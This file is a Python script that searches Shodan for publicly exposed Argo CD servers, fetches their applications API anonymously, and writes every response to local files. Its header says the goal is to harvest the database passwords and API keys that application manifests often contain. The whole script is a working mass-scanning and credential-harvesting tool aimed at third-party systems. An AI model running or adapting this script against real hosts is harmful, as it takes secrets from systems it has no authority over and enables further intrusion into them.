#!/usr/bin/env python3
#
# argocd.py
# Search SHODAN for Argo CD instances with anonymous access enabled and pull
# the applications API. Application manifests embed Helm values and Git URLs
# — frequently including database passwords and API keys.
#
# Author: random_robbie

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common import get_api_key, open_output

import shodan
import requests

# Configuration
SEARCH_FOR = 'http.title:"Argo CD"'
APPS_PATH = "/api/v1/applications"
CFG_DIR = "cfg"
session = requests.Session()


def grab_apps(ip, port):
    """Check whether the applications API answers without authentication."""
    print("[*] Testing: " + ip + " on Port: " + port + "[*]\n")
    try:
        url = "http://" + ip + ":" + port + APPS_PATH
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Connection": "close",
            "Accept": "application/json",
        }
        response = session.get(url, headers=headers, timeout=15, verify=False)
        if response.status_code == 200 and "items" in response.text:
            with open_output(os.path.join(CFG_DIR, ip + "-argocd.json"), "a") as fh:
                fh.write(response.text + "\n")
            print("[*] Anonymous Argo CD application access Whooops.. [*]\n")
        else:
            print("[*] Argo CD requires authentication. [*]\n")
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        print(e)
        print("[*] Nothing Found on IP:" + ip + " [*]\n")


def main():
    api = shodan.Shodan(get_api_key())
    result = api.search(SEARCH_FOR)
    for service in result["matches"]:
        grab_apps(service["ip_str"], str(service["port"]))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        sys.exit("Error: %s" % e)
